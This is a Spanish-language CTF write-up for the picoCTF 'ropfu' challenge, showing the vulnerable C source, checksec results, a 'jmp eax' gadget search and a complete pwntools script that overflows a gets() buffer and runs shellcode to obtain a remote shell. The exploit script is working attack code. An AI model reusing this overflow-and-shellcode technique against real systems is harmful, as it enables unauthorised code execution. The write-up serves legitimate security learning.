#pwn #writeup #ctf

# Reconocimiento

Se nos ofrece un binario *vuln* y su código fuente:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

Si utilizamos [[checksec]]:

```bash
checksec --file=vuln
```
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   2229 Symbols	  No
```

Tenemos una entrada por *gets* en la función *vuln*, de la que podríamos aprovecharnos. Podemos ejecutar código del stack (*NX disabled*), sin embargo tenemos una protección [[canary]] (que saltaría con cualquier función, aunque, probablemente *vuln* no la tenga). Además, el binario es *statically linked*, por lo que trae todas las dependencias incluidas.

# Explotación

Como utilizamos *gets*, estamos guardando la información en el *eax* (y recordemos que podemos ejecutar código del stack). Podríamos tratar de mandar un código malicioso, seguido de un *offset* en la parte del canary y un *jmp eax* en el *return address* que salte al inicio y lo ejecute.

Con [[ropper]] podemos sacar el gadget que necesitamos:

```bash
ropper --file vuln --search "jmp"
```
```c
0x0805333b: jmp eax;
```

Con [[gdb]]-[[pwndbg]] sacaremos el *offset* hasta el *return address*, en este caso 28.

Así podemos crear un *autopwn.py*:

```python
#! /bin/python3

from pwn import *
import sys

binary = './vuln'
elf = ELF(binary)

def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 53607)
    else: return process(binary)

jmp_eax = 0x0805333b

payload = b'\x90' * 26
payload += b'\xeb\x04'
payload += p32(jmp_eax)

payload += asm(shellcraft.i386.linux.sh())

with open("output.bin", "wb") as file:

    file.write(payload)

io = start()

io.recvuntil("grasshopper!")
io.sendline(payload)

io.interactive()
```

Como *offset* metemos 26 *nops* y la cadena `\xeb\x04`, que salta 4 bytes, de forma que al ejecutarse, no ejecutemos el contenido de  la dirección de retorno (lo que llevaría a comportamientos indefinidos):

![[ropfu1.png]]

Al ejecutar con el parámetro *REMOTE* conseguiríamos una shell.